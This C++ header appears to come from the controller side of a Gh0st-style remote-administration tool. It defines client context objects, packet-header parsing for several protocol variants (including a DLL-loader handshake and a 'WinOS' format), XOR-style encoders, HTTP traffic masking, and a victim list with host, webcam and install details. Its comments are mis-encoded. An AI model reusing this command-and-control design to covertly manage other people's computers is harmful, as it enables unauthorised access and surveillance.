#pragma once

#include "stdafx.h"
#include "common/mask.h"
#include "common/header.h"
#include "common/encrypt.h"

#include "Buffer.h"
#define XXH_INLINE_ALL
#include "xxhash.h"
#include <WS2tcpip.h>
#include <common/ikcp.h>

#define PACKET_LENGTH   0x2000

std::string GetPeerName(SOCKET sock);
std::string GetRemoteIP(SOCKET sock);

enum
{
	ONLINELIST_IP = 0,          // IP����˳��
	ONLINELIST_ADDR,            // ��ַ
	ONLINELIST_LOCATION,        // ����λ��
	ONLINELIST_COMPUTER_NAME,   // �������/��ע
	ONLINELIST_OS,              // ����ϵͳ
	ONLINELIST_CPU,             // CPU
	ONLINELIST_VIDEO,           // ����ͷ(����)
	ONLINELIST_PING,            // PING(�Է�������)
	ONLINELIST_VERSION,	        // �汾��Ϣ
	ONLINELIST_INSTALLTIME,     // ��װʱ��
	ONLINELIST_LOGINTIME,       // �����
	ONLINELIST_CLIENTTYPE,		// �ͻ�������
	ONLINELIST_PATH,			// �ļ�·��
	ONLINELIST_MAX,
};

enum {
	PARSER_WINOS = -2,
	PARSER_FAILED = -1,			// ����ʧ��
	PARSER_NEEDMORE = 0,		// ��Ҫ��������
};

typedef struct PR {
	int Result;
	bool IsFailed() const {
		return PARSER_FAILED == Result;
	}
	bool IsNeedMore() const {
		return PARSER_NEEDMORE == Result;
	}
	bool IsWinOSLogin() const {
		return PARSER_WINOS == Result;
	}
}PR;

enum {
	COMPRESS_UNKNOWN = -2,			// δ֪ѹ���㷨
	COMPRESS_ZLIB = -1,				// ��ǰ�汾ʹ�õ�ѹ������
	COMPRESS_ZSTD = 0,				// ��ǰʹ�õ�ѹ������
	COMPRESS_NONE = 1,				// û��ѹ��
};

// Header parser: parse the data to make sure it's from a supported client.
class HeaderParser {
	friend class CONTEXT_OBJECT;
protected:
	HeaderParser() {
		m_Masker = nullptr;
		m_Encoder = nullptr;
		m_Encoder2 = nullptr;
		m_bParsed = FALSE;
		m_nHeaderLen = m_nCompareLen = m_nFlagLen = 0;
		m_nFlagType = FLAG_UNKNOWN;
		memset(m_szPacketFlag, 0, sizeof(m_szPacketFlag));
	}
	virtual ~HeaderParser() {
		Reset();
	}
	std::string getXForwardedFor(const std::string& headers) {
		const std::string key = "X-Forwarded-For: ";
		size_t pos = headers.find(key);
		if (pos == std::string::npos)
			return "";
		pos += key.size();
		size_t end = headers.find("\r\n", pos);
		if (end == std::string::npos) 
			return "";
		std::string ip = headers.substr(pos, end - pos);
		return ip;
	}
	PR Parse(CBuffer& buf, int& compressMethod, std::string &peer) {
		const int MinimumCount = MIN_COMLEN;
		if (buf.GetBufferLength() < MinimumCount) {
			return PR{ PARSER_NEEDMORE };
		}
		// UnMask
		char* src = (char*)buf.GetBuffer();
		ULONG srcSize = buf.GetBufferLength();
		PkgMaskType maskType = MaskTypeUnknown;
		ULONG ret = TryUnMask(src, srcSize, maskType);
		std::string str = buf.Skip(ret);
		if (maskType == MaskTypeHTTP) {
			std::string clientIP = getXForwardedFor(str);
			if (!clientIP.empty()) peer = clientIP;
		}
		if (nullptr == m_Masker) {
			m_Masker = maskType ? new HttpMask(peer) : new PkgMask();
		}
		if ((maskType && ret == 0) || (buf.GetBufferLength() <= MinimumCount))
			return PR{ PARSER_NEEDMORE };

		char szPacketFlag[32] = { 0 };
		buf.CopyBuffer(szPacketFlag, MinimumCount, 0);
		HeaderEncType encTyp = HeaderEncUnknown;
		FlagType flagType = CheckHead(szPacketFlag, encTyp);
		if (flagType == FLAG_UNKNOWN) {
			// ���ݳ��� + ͨ������ [4�ֽ�����ʱ��+4��0�ֽ�+�����ʶ+ϵͳλ����ʶ]
			const BYTE* ptr = (BYTE*)buf.GetBuffer(0), * p = ptr + 4;
			int length = *((int*)ptr);
			int excepted = buf.GetBufferLength();
			if (length == excepted && length == 16 && p[4] == 0 && p[5] == 0 &&
				p[6] == 0 && p[7] == 0 && p[8] == 202 && (p[9] == 0 || p[9] == 1)) {
				m_nFlagType = FLAG_WINOS;
				compressMethod = COMPRESS_NONE;
				memcpy(m_szPacketFlag, p, 10); // ͨ������
				m_nCompareLen = 0;
				m_nFlagLen = 0;
				m_nHeaderLen = 14;
				m_bParsed = TRUE;
				m_Encoder = new Encoder();
				m_Encoder2 = new WinOsEncoder();
				return PR{ PARSER_WINOS };
			}
			return PR{ PARSER_FAILED };
		}
		if (m_bParsed) { // Check if the header has been parsed.
			return memcmp(m_szPacketFlag, szPacketFlag, m_nCompareLen) == 0 ? PR{ m_nFlagLen } : PR{ PARSER_FAILED };
		}
		// More version may be added in the future.
		switch (m_nFlagType = flagType)
		{
		case FLAG_UNKNOWN:
			return PR{ PARSER_FAILED };
		case FLAG_SHINE:
			memcpy(m_szPacketFlag, szPacketFlag, 5);
			m_nCompareLen = 5;
			m_nFlagLen = m_nCompareLen;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			assert(NULL==m_Encoder);
			assert(NULL==m_Encoder2);
			m_Encoder = new Encoder();
			m_Encoder2 = new Encoder();
			break;
		case FLAG_FUCK:
			memcpy(m_szPacketFlag, szPacketFlag, 8);
			m_nCompareLen = 8;
			m_nFlagLen = m_nCompareLen + 3;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new XOREncoder();
			m_Encoder2 = new Encoder();
			break;
		case FLAG_HELLO:
			// This header is only for handling SOCKET_DLLLOADER command
			memcpy(m_szPacketFlag, szPacketFlag, 8);
			m_nCompareLen = 6;
			m_nFlagLen = 8;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			compressMethod = COMPRESS_NONE;
			m_Encoder = new Encoder();
			m_Encoder2 = new XOREncoder16();
			break;
		case FLAG_HELL:
			// This version
			memcpy(m_szPacketFlag, szPacketFlag, 8);
			m_nCompareLen = FLAG_COMPLEN;
			m_nFlagLen = FLAG_LENGTH;
			m_nHeaderLen = m_nFlagLen + 8;
			m_bParsed = TRUE;
			m_Encoder = new Encoder();
			m_Encoder2 = new XOREncoder16();
			break;
		default:
			break;
		}
		return PR{ m_nFlagLen };
	}
	BOOL IsEncodeHeader() const {
		return m_nFlagType == FLAG_HELLO || m_nFlagType == FLAG_HELL;
	}
	HeaderParser& Reset() {
		if (m_Masker) {
			m_Masker->Destroy();
			m_Masker = nullptr;
		}
		SAFE_DELETE(m_Encoder);
		SAFE_DELETE(m_Encoder2);
		m_bParsed = FALSE;
		m_nHeaderLen = m_nCompareLen = m_nFlagLen = 0;
		m_nFlagType = FLAG_UNKNOWN;
		memset(m_szPacketFlag, 0, sizeof(m_szPacketFlag));
		return *this;
	}
	BOOL IsParsed() const {
		return m_bParsed;
	}
	int GetFlagLen() const {
		return m_nFlagLen;
	}
	int GetHeaderLen() const {
		return m_nHeaderLen;
	}
	const char* GetFlag() const {
		return m_szPacketFlag;
	}
	FlagType GetFlagType() const {
		return m_nFlagType;
	}
	Encoder* GetEncoder() const {
		return m_Encoder;
	}
	Encoder* GetEncoder2() const {
		return m_Encoder2;
	}
private:
	BOOL				m_bParsed;					// ���ݰ��Ƿ���Խ���
	int					m_nHeaderLen;				// ���ݰ���ͷ����
	int					m_nCompareLen;				// �ȶ��ֽ���
	int					m_nFlagLen;					// ��ʶ����
	FlagType			m_nFlagType;				// ��ʶ����
	char				m_szPacketFlag[32];			// �Ա���Ϣ
	Encoder*			m_Encoder;					// ������
	Encoder*			m_Encoder2;					// ������2
	PkgMask*			m_Masker;
};

enum IOType
{
	IOInitialize,
	IORead,
	IOWrite,
	IOIdle
};

#define TRACK_OVERLAPPEDPLUS 0

class OVERLAPPEDPLUS
{
public:

	OVERLAPPED			m_ol;
	IOType				m_ioType;

	OVERLAPPEDPLUS(IOType ioType)
	{
#if TRACK_OVERLAPPEDPLUS
		char szLog[100];
		sprintf_s(szLog, "=> [new] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
		Mprintf(szLog);
#endif
		ZeroMemory(this, sizeof(OVERLAPPEDPLUS));
		m_ioType = ioType;
	}

	~OVERLAPPEDPLUS()
	{
#if TRACK_OVERLAPPEDPLUS
		char szLog[100];
		sprintf_s(szLog, "=> [delete] OVERLAPPEDPLUS %p by thread [%d].\n", this, GetCurrentThreadId());
		Mprintf(szLog);
#endif
	}
};

typedef BOOL (CALLBACK* pfnNotifyProc)(CONTEXT_OBJECT* ContextObject);
typedef BOOL (CALLBACK* pfnOfflineProc)(CONTEXT_OBJECT* ContextObject);

class Server
{
public:
	friend class CONTEXT_OBJECT;

	Server() {}
	virtual ~Server() {}

	virtual int GetPort() const = 0;

	virtual UINT StartServer(pfnNotifyProc NotifyProc, pfnOfflineProc OffProc, USHORT uPort) = 0;

	virtual	void Send2Client(CONTEXT_OBJECT* ContextObject, PBYTE szBuffer, ULONG ulOriginalLength) = 0;

	virtual void UpdateMaxConnection(int maxConn) {}

	virtual void Destroy() {}

	virtual void Disconnect(CONTEXT_OBJECT* ctx) {}
};

class context {
public:
	// ���麯��
	virtual VOID InitMember(SOCKET s, Server* svr)=0;
	virtual void Send2Client(PBYTE szBuffer, ULONG ulOriginalLength) = 0;
	virtual CString GetClientData(int index)const = 0;
	virtual void GetAdditionalData(CString(&s)[RES_MAX]) const =0;
	virtual uint64_t GetClientID() const = 0;
	virtual std::string GetPeerName() const = 0;
	virtual int GetPort() const = 0;
	virtual std::string GetProtocol() const = 0;
	virtual int GetServerPort() const = 0;
	virtual FlagType GetFlagType() const = 0;

public:
	virtual ~context() {}
	virtual void Destroy() {}
	virtual BOOL IsLogin() const { 
		return TRUE;
	}
	virtual bool IsEqual(context *ctx) const {
		return this == ctx || (GetPeerName() == ctx->GetPeerName() && GetPort() == ctx->GetPort());
	}
};

typedef class CONTEXT_OBJECT : public context
{
public:
	virtual ~CONTEXT_OBJECT(){
		if (kcp) {
			ikcp_release(kcp);
			kcp = nullptr;
		}
	}
	CString  sClientInfo[ONLINELIST_MAX];
	CString  additonalInfo[RES_MAX];
	SOCKET   sClientSocket;
	WSABUF   wsaInBuf;
	WSABUF	 wsaOutBuffer;
	char     szBuffer[PACKET_LENGTH];
	CBuffer				InCompressedBuffer;	        // ���յ���ѹ��������
	CBuffer				InDeCompressedBuffer;	    // ��ѹ�������
	CBuffer             OutCompressedBuffer;
	HWND				hWnd;
	HANDLE              hDlg;
	OVERLAPPEDPLUS*		olps;						// OVERLAPPEDPLUS
	int					CompressMethod;				// ѹ���㷨
	HeaderParser		Parser;						// ��������Э��
	uint64_t			ID;							// Ψһ��ʶ

	BOOL				m_bProxyConnected;			// �����Ƿ�����
	BOOL 				bLogin;						// �Ƿ� login
	std::string			PeerName;					// �Զ�IP
	Server*				server;						// ���������
	ikcpcb*				kcp = nullptr;				// ������ָ��KCP�Ự

	std::string GetProtocol() const override {
		return Parser.m_Masker && Parser.m_Masker->GetMaskType() == MaskTypeNone ? "TCP" : "HTTP";
	}
	int GetServerPort() const override {
		return server->GetPort();
	}
	VOID InitMember(SOCKET s, Server *svr)
	{
		memset(szBuffer, 0, sizeof(char) * PACKET_LENGTH);
		hWnd = NULL;
		hDlg = NULL;
		sClientSocket = s;
		PeerName = ::GetPeerName(sClientSocket);
		memset(&wsaInBuf, 0, sizeof(WSABUF));
		memset(&wsaOutBuffer, 0, sizeof(WSABUF));
		olps = NULL;
		for (int i = 0; i < ONLINELIST_MAX; i++) {
			sClientInfo[i].Empty();
		}
		for (int i = 0; i < RES_MAX; i++) {
			additonalInfo[i].Empty();
		}
		CompressMethod = COMPRESS_ZSTD;
		Parser.Reset();
		bLogin = FALSE;
		m_bProxyConnected = FALSE;
		server = svr;
	}
	Server* GetServer() {
		return server;
	}
	VOID Send2Client(PBYTE szBuffer, ULONG ulOriginalLength) override {
		if (server)
			server->Send2Client(this, szBuffer, ulOriginalLength);
	}
	VOID SetClientInfo(const CString(&s)[ONLINELIST_MAX], const std::vector<std::string>& a = {}) {
		for (int i = 0; i < ONLINELIST_MAX; i++)
		{
			sClientInfo[i] = s[i];
		}
		for (int i = 0; i < a.size(); i++) {
			additonalInfo[i] = a[i].c_str();
		}
	}
	PBYTE GetBuffer(int offset) {
		return InDeCompressedBuffer.GetBuffer(offset);
	}
	ULONG GetBufferLength() {
		return InDeCompressedBuffer.GetBufferLength();
	}
	virtual std::string GetPeerName() const {
		return PeerName;
	}
	virtual int GetPort() const {
		return sClientSocket;
	}
	CString GetClientData(int index)  const override {
		return sClientInfo[index];
	}
	void GetAdditionalData(CString(&s)[RES_MAX])  const override {
		for (int i = 0; i < RES_MAX; i++)
		{
			s[i] = additonalInfo[i];
		}
	}
	BOOL IsLogin() const override {
		return bLogin;
	}
	uint64_t GetClientID() const override {
		return ID;
	}
	void CancelIO() {
		SAFE_CANCELIO(sClientSocket);
	}
	BOOL CopyBuffer(PVOID pDst, ULONG nLen, ULONG ulPos) {
		return InDeCompressedBuffer.CopyBuffer(pDst, nLen, ulPos);
	}
	BYTE GetBYTE(int offset) {
		return InDeCompressedBuffer.GetBYTE(offset);
	}
	virtual FlagType GetFlagType() const override {
		return Parser.m_nFlagType;
	}
	// Write compressed buffer.
	void WriteBuffer(LPBYTE data, ULONG dataLen, ULONG originLen, int cmd = -1) {
		if (Parser.IsParsed()) {
			ULONG totalLen = dataLen + Parser.GetHeaderLen();
			BYTE szPacketFlag[32] = {};
			const int flagLen = Parser.GetFlagLen();
			memcpy(szPacketFlag, Parser.GetFlag(), flagLen);
			if (Parser.IsEncodeHeader())
				encrypt(szPacketFlag, FLAG_COMPLEN, szPacketFlag[flagLen - 2]);
			CBuffer buf;
			buf.WriteBuffer((LPBYTE)szPacketFlag, flagLen);
			buf.WriteBuffer((PBYTE)&totalLen, sizeof(ULONG));
			if (Parser.GetFlagType() == FLAG_WINOS) {
				memcpy(szPacketFlag, Parser.GetFlag(), 10);
				buf.WriteBuffer((PBYTE)Parser.GetFlag(), 10);
			}
			else {
				buf.WriteBuffer((PBYTE)&originLen, sizeof(ULONG));
				InDeCompressedBuffer.CopyBuffer(szPacketFlag + flagLen, 16, 16);
			}
			Encode2(data, dataLen, szPacketFlag);
			buf.WriteBuffer(data, dataLen);
			// Mask
			char* src = (char*)buf.GetBuffer(), *szBuffer = nullptr;
			ULONG ulLength = 0;
			Parser.m_Masker->Mask(szBuffer, ulLength, src, buf.GetBufferLen(), cmd);
			OutCompressedBuffer.WriteBuffer((LPBYTE)szBuffer, ulLength);
			if (szBuffer != src)
				SAFE_DELETE_ARRAY(szBuffer);
		}
	}
	// Read compressed buffer.
	PBYTE ReadBuffer(ULONG& dataLen, ULONG& originLen) {
		if (Parser.IsParsed()) {
			ULONG totalLen = 0;
			BYTE szPacketFlag[32] = {};
			InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, Parser.GetFlagLen());
			InCompressedBuffer.ReadBuffer((PBYTE)&totalLen, sizeof(ULONG));
			if (Parser.GetFlagType() == FLAG_WINOS) {
				InCompressedBuffer.ReadBuffer((PBYTE)szPacketFlag, 10);
			}
			else {
				InCompressedBuffer.ReadBuffer((PBYTE)&originLen, sizeof(ULONG));
			}
			dataLen = totalLen - Parser.GetHeaderLen();
			PBYTE CompressedBuffer = new BYTE[dataLen];
			InCompressedBuffer.ReadBuffer(CompressedBuffer, dataLen);
			Decode2(CompressedBuffer, dataLen, szPacketFlag);
			return CompressedBuffer;
		}
		return nullptr;
	}
	// Parse the data to make sure it's from a supported client. The length of `Header Flag` will be returned.
	PR Parse(CBuffer& buf) {
		return Parser.Parse(buf, CompressMethod, PeerName);
	}
	// Encode data before compress.
	void Encode(PBYTE data, int len) const {
		Parser.GetEncoder()->Encode((unsigned char*)data, len);
	}
	// Decode data after uncompress.
	void Decode(PBYTE data, int len) const {
		Parser.GetEncoder()->Decode((unsigned char*)data, len);
	}
	// Encode data after compress.
	void Encode2(PBYTE data, int len, PBYTE param) const {
		Parser.GetEncoder2()->Encode((unsigned char*)data, len, param);
	}
	// Decode data before uncompress.
	void Decode2(PBYTE data, int len, PBYTE param) const {
		Parser.GetEncoder2()->Decode((unsigned char*)data, len, param);
	}
	std::string RemoteAddr() const {
		sockaddr_in  ClientAddr = {};
		int ulClientAddrLen = sizeof(sockaddr_in);
		int s = getpeername(sClientSocket, (SOCKADDR*)&ClientAddr, &ulClientAddrLen);
		return s != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";
	}
	static uint64_t CalculateID(const CString(&data)[ONLINELIST_MAX]) {
		int idx[] = { ONLINELIST_IP, ONLINELIST_COMPUTER_NAME, ONLINELIST_OS, ONLINELIST_CPU, ONLINELIST_PATH, };
		CString s;
		for (int i = 0; i < 5; i++) {
			s += data[idx[i]] + "|";
		}
		s.Delete(s.GetLength() - 1);
		return XXH64(s.GetString(), s.GetLength(), 0);
	}
	uint64_t GetID() const { return ID; }
	void SetID(uint64_t id) { ID = id; }
}CONTEXT_OBJECT, * PCONTEXT_OBJECT;

typedef CList<PCONTEXT_OBJECT> ContextObjectList;

class CONTEXT_UDP : public CONTEXT_OBJECT {
public:
	int					addrLen = 0;
	sockaddr_in			clientAddr = {};
	CONTEXT_UDP() {
	}
	virtual ~CONTEXT_UDP() {
	}
	std::string GetProtocol() const override {
		return "UDP";
	}
	VOID InitMember(SOCKET s, Server* svr) override {
		CONTEXT_OBJECT::InitMember(s, svr);
		clientAddr = {};
		addrLen = sizeof(sockaddr_in);
	}
	void Destroy() override {
		delete this;
	}
	virtual std::string GetPeerName() const override {
		char client_ip[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &clientAddr.sin_addr, client_ip, INET_ADDRSTRLEN);
		return client_ip;
	}
	virtual int GetPort() const override {
		int client_port = ntohs(clientAddr.sin_port);
		return client_port;
	}
};
